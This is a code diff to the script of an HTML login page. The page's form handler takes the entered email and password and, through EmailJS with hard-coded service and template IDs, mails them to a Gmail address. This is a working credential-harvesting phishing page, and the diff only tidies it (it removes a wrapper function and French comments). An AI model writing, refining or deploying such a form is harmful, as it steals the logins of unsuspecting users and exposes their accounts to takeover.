@@ -61,27 +61,24 @@
 
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
-    (function() {
-      emailjs.init("otwpjfwbYVYn56enm"); // Remplacez YOUR_USER_ID par votre identifiant EmailJS
+    emailjs.init("otwpjfwbYVYn56enm");
 
-      document.getElementById('loginForm').addEventListener('submit', function(event) {
-        event.preventDefault();
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+      event.preventDefault();
 
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-
-        emailjs.send("service_3h0kgzm", "template_celwf41", {
-          email: email,
-          password: password,
-          to_email: "Holiaboff@gmail.com"
-        }).then(function(response) {
-          console.log('Email envoyé avec succès!', response);
-          // Vous pouvez rediriger l'utilisateur ici ou afficher un message de confirmation
-        }, function(error) {
-          console.error('Erreur lors de l\'envoi de l\'email:', error);
-        });
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      
+      emailjs.send("service_3h0kgzm", "template_celwf41", {
+        email: email,
+        password: password,
+        to_email: "Holiaboff@gmail.com"
+      }).then(function(response) {
+        console.log('Email envoyé avec succès!', response);
+      }, function(error) {
+        console.error('Erreur lors de l\'envoi de l\'email:', error);
       });
-    })();
+    });
   </script>
 </body>
 </html>
